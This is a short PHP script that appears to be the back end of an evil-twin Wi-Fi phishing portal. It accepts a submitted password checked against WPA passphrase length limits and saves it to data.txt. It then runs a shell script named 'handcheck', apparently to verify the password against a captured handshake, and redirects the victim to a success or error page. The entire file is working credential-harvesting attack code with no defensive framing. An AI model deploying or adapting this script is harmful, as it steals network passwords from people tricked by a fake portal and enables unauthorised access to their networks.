
<?php
error_reporting(0);


// Receive form Post data and Saving it in variables

$key1 = @$_POST['key1'];

// Write the name of text file where data will be store
$filename = "data.txt";
$filename2 = "status.txt";
$intento = "intento";


// Marge all the variables with text in a single variable. 
$data= ''.$key1.'';


if ( (strlen($key1) < 8) ) {
echo "<script type=\"text/javascript\">alert(\"The password must be more than 7 characters\");window.history.back()</script>";
exit();
}

else if ( (strlen($key1) > 63) ) {
echo "<script type=\"text/javascript\">alert(\"The password must be less than 64 characters\");window.history.back()</script>";
exit();
}


$file = fopen($filename, "w");
fwrite($file,"$data");
fwrite($file,"\n");
fclose($file);


system("bash handcheck");


if (file_get_contents("$intento") == 1) {
	    header("location:final.html");
	   
	} 
else {
	    header("location:error.html");
	 
	}
	
?>
